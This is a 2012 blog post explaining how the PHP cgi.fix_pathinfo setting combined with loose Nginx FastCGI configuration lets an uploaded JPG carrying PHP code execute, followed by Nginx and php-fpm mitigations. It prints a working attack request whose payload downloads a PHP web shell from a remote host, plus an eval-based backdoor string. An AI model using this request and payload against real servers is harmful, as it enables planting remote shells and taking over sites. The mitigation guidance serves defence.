---
layout: post
title: Understand the cgi.fix_pathinfo security issue
author:
tags:
- PHP
- Nginx
- security
wordpress_id: 66
wordpress_url: http://kaiwangchen.com/?p=66
date: 2012-10-03 06:28:52 +0800
---

If I read it correctly, the [`cgi.fix_pathinfo` security issue][1] was brought into discussion by [laruence][2] in late May, 2010 that with [`SCRIPT_FILENAME`][3] set by greedy regular expression capturing, PHP web application is vulnerable to backdoor attachment attack. His points were supplemented by another [post][4] claiming that PHP scripts is always vulnerable with cgi.fix_pathinfo enabled, regardless of Nginx configuration. 

Let's recap the issue. Having made [backdoor.jpg][5] into position, say by normal upload process, the attacker is able to install his [phpshell][6] by<!--more-->: 

    POST /upload/backdoor.jpg/1.php HTTP/1.0
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 152
    
    pass=fwrite%28fopen%28%22.%2Fx.php%22%2C+%22w%22%29%2Cfile_get_contents%28%22http%3A%2F%2Fkaiwangchen.com%2Ffiles%2F2012%2F10%2Fphpshell.txt%22%29%29%3B

The text value could be decoded as 

    fwrite(fopen("./x.php", "w"),file_get_contents("{{ site.url }}{{ site.fileurl }}/2012/10/phpshell.txt"));

With the following minimal configuration snippet, 

    location ~ \.php$ {
        fastcgi_pass  127.0.0.1:9000;
        fastcgi_index index.php;
        fastcgi_param  PATH_TRANSLATED    $document_root$fastcgi_script_name;
        fastcgi_param  SCRIPT_NAME        $fastcgi_script_name;
        fastcgi_param  PATH_INFO          $fastcgi_path_info;
        fastcgi_param  REQUEST_METHOD     $request_method;
    }

the request URI is automatically split into [`$fastcgi_script_name`][7] and $fastcgi_path_info, which are `/upload/backdoor.jpg/1.php` and empty string respectively. That way, the PHP backend is asked to execute script file `$document_root/upload/backdoor.jpg/1.php`, however, the script does not exist. With [`cgi.fix_pathinfo`][8] enabled, it will try upwards to the parent path, where is an JPG picture containing a malicious string like `<?php eval($POST['pass'])?>`. The picture file will be taken as a PHP script, and the `POST`'ed value is [`eval`][9]'ed to do anything the attacker like. 

It is clear that the problem is *wrong SCRIPT_FILENAME*. Since version [0\.7.31][10] released on 19 Jan 2009, Nginx provides [`fastcgi_split_path_info`][11] to allow the setting of the SCRIPT_NAME, PATH_INFO and PATH_TRANSLATED (a.k.a the non-standard SCRIPT_FILENAME) variables of the [CGI specification][12]. If the web application is well organized, for instance, CodeIgniter comes with a [front controller][13], the splitting could be strictly configured to avoid the issue 

    fastcgi_split_path_info ^(/index.php)(.*);

Otherwise, with a loose design, the only way is to disable the `cgi.fix_pathinfo` feature. Good news is that a new php-fpm configururation option, [security.limit_extensions][14], is introduced in [PHP 5.3.9][15] on Jan 10, 2012 to alleviate the issue. It by default allows only `.php` as file suffix when trying upwards the translated path, as a result, the attacker will be prompted *access denied*. 

Alternatively, [`try_files`][16] could be used to assure the existence of scripts from Nginx: 

    try_files $uri $uri/ /index.php;
    location ~* \.php {
       # fastcgi_pass ...
    }

Eventually, as the upload directory is usually explict, it can be catogorized into those for static files with an empty prefix-matching [`location`][17] directive, thus disabling any PHP interpretation: 

    location ^~ /upload { }

Good luck.

 [1]: http://www.80sec.com/nginx-securit.html
 [2]: http://www.laruence.com/2010/05/20/1495.html
 [3]: http://www.php.net/manual/en/reserved.variables.server.php
 [4]: http://www.phpvim.net/web/php/security-risks-caused-by-fix-pathinfo.html
 [5]: {{ site.fileurl }}/2012/10/20120626_214dbc5f4b002a38a3fXhO8VBToqhf11.jpg
 [6]: {{ site.fileurl }}/2012/10/phpshell.txt
 [7]: http://wiki.nginx.org/HttpFcgiModule#.24fastcgi_script_name
 [8]: http://www.php.net/manual/en/ini.core.php#ini.cgi.fix-pathinfo
 [9]: http://cn.php.net/manual/en/function.eval.php
 [10]: http://nginx.org/en/CHANGES
 [11]: http://wiki.nginx.org/HttpFcgiModule#fastcgi_split_path_info
 [12]: http://www.ietf.org/rfc/rfc3875
 [13]: http://codeigniter.com/user_guide/overview/appflow.html
 [14]: https://bugs.php.net/bug.php?id=55181
 [15]: http://php.net/ChangeLog-5.php
 [16]: http://wiki.nginx.org/HttpCoreModule#try_files
 [17]: http://wiki.nginx.org/HttpCoreModule#location
